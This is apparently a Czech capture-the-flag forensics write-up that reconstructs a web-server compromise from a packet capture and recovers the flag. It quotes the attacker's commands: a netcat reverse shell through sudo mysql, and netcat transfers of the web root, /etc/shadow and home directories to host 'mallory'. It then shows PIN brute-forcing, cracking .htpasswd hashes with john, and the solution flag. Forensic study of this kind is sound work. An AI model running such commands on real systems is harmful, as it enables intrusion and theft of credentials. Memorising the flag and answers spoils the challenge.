# Suspicious communication (5)

## Zadání

Hi, emergency troubleshooter,

one of our web servers has apparently been compromised, analyze what happened from the record of recorded suspicious communication.

Stay grounded!

* [Download pcap for analysis](suspicious_communication.zip)

## Řešení

Stažený soubor ze zadání je záznam komunikace.

Zajímavý je záznam na portu 42121

```sh
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a

Linux 2c1c649ff17d 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64 GNU/Linux

whoami

www-data

pwd

/var/www/html/uploads

df -h

Filesystem      Size  Used Avail Use% Mounted on
overlay          98G   44G   51G  47% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda2        98G   44G   51G  47% /shared
tmpfs           3.9G     0  3.9G   0% /proc/acpi
tmpfs           3.9G     0  3.9G   0% /sys/firmware

tar -zcf /tmp/html.tgz /var/www/html
cat /tmp/html.tgz | nc mallory 42122
sudo -l

Matching Defaults entries for www-data on 2c1c649ff17d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 2c1c649ff17d:
    (root) NOPASSWD: /usr/bin/mysql*

sudo /usr/bin/mysql -e '\! nc -e /bin/sh mallory 42123'
exit
```

Na portu 42122 jsou přeneseny zdrojové soubory WEB serveru jako `html.tgz`.

Na portu 42123

```sh
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
tcpdump:x:102:104::/nonexistent:/usr/sbin/nologin
webmaster:x:1000:1000:,,,:/home/webmaster:/bin/bash

tar zcf /tmp/all.tgz /etc /root /home
curl -k -s https://mallory:42120/pincode/`hostname -f` > /tmp/secret
ls -alh /tmp

total 17M
drwxrwxrwt 1 root     root     4.0K Jul 16 08:07 .
drwxr-xr-x 1 root     root     4.0K Jul 16 08:05 ..
-rw-r--r-- 1 root     root      17M Jul 16 08:07 all.tgz
-rw------- 1 root     root      182 Jul 16 08:05 apache2-stderr---supervisor-gvzlqfqv.log
-rw------- 1 root     root        0 Jul 16 08:05 apache2-stdout---supervisor-l6ohlz0u.log
-rw-r--r-- 1 www-data www-data  46K Jul 16 08:07 html.tgz
-rw------- 1 root     root        0 Jul 16 08:05 mysqld_safe-stderr---supervisor-g6ruwbqj.log
-rw------- 1 root     root      135 Jul 16 08:05 mysqld_safe-stdout---supervisor-lct36jfa.log
drwxr-xr-x 2 root     root     4.0K Jul 16 08:05 output
-rw------- 1 root     root      131 Jul 16 08:05 pcap-stderr---supervisor-cl8n5_cp.log
-rw------- 1 root     root        0 Jul 16 08:05 pcap-stdout---supervisor-qrq22yby.log
-rw-r--r-- 1 root     root        6 Jul 16 08:07 secret

cat /etc/shadow | openssl enc -aes-256-cbc -e -a -salt -pbkdf2 -iter 10 -pass file:/tmp/secret | nc mallory 42124
cat /tmp/all.tgz | openssl enc -aes-256-cbc -e -a -salt -pbkdf2 -iter 10 -pass file:/tmp/secret | nc mallory 42125
exit
```

A na portu 42124 a 42125 jsou přenesena zašifrované soubory `shadow` a `all.tgz`.

Ze záznamu na portu 42123 je zřejmé, že šifrovací klíč má délku 3 znaků a protože se jedná o pin, skládá se jen z čísel.

Stáhneme si zašifrované soubory přenesené na portech 42124 a 42125 a Base64 dekódujeme.

Pro zjištění hesla (pinu) použijeme [bruteforce-salted-openssl](https://github.com/glv2/bruteforce-salted-openssl).

`bruteforce-salted-openssl -t 4 -l 6 -m 6 -s "0123456789" -K -i 10 shadow`

Po chvilce se zobrazí heslo `101525`.

Rozkódujeme soubory

```text
openssl enc -aes-256-cbc -d -salt -pbkdf2 -iter 10 -pass pass:101525 -in shadow_enc -out shadow
openssl enc -aes-256-cbc -d -salt -pbkdf2 -iter 10 -pass pass:101525 -in all.tar.gz_enc -out all.tar.gz
```

V souboru `etc\ssl\private\ssl-cert-snakeoil.key` v `all.tar.gz` je RSA klíč pro WEB server, který nám dovolí ve Wiresharku rozkódovat HTTPS komunikaci <https://wiki.wireshark.org/TLS>.

Rámec č. 99398 sice zmiňuje URL `app/backupflag.php`

`<p><a href="/app/backupflag.php" class="btn btn-danger">Create and Download Encrypted Backup of Flag</a></p>\n`

ale v rámci 111711 je použito `app/backup.php`, které stáhne

`aOI32ayLIofLCXLWZtzmdY077Q1jcYUQof7GFBbOWHY=`

FLAG kóduje `backup.php` takto

```php
<?php
require 'auth.php';
require_auth();

if (!is_admin()) {
    http_response_code(403);
    die('Access denied. Only admin can create backup.');
}

$flagPath = "/secrets/flag.txt";
$password = current_pass();

if (!file_exists($flagPath)) {
    die("Flag file not found.");
}

$flagData = file_get_contents($flagPath);

$iv = substr(hash('sha256', 'iv' . $password), 0, 16);
$key = hash('sha256', $password, true);

$encrypted = openssl_encrypt($flagData, 'aes-256-cbc', $key, 0, $iv);
if ($encrypted === false) {
    die("Encryption failed.");
}

// Nabídne soubor k downloadu
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="backup.enc"');
header('Content-Length: ' . strlen($encrypted));

echo $encrypted;
exit;
```

Je ještě potřeba zjistit admin heslo, které je zakódováno v `all.tar.gz` v souboru `etc\apache2\.htpasswd`.

`john .htpasswd`

```text
tester           (alice)
Bananas9         (admin)
```

Heslo máme, můžeme dekódovat

```php
<?php
$password="Bananas9";
$flagData="aOI32ayLIofLCXLWZtzmdY077Q1jcYUQof7GFBbOWHY=";

$iv = substr(hash('sha256', 'iv' . $password), 0, 16);
$key = hash('sha256', $password, true);

$decrypted = openssl_decrypt($flagData, 'aes-256-cbc', $key, 0, $iv);
echo $decrypted;
?>
```

`php -f decode.php`

## Flag

`FLAG{kyAi-J2NA-n6nE-ZIX6}`
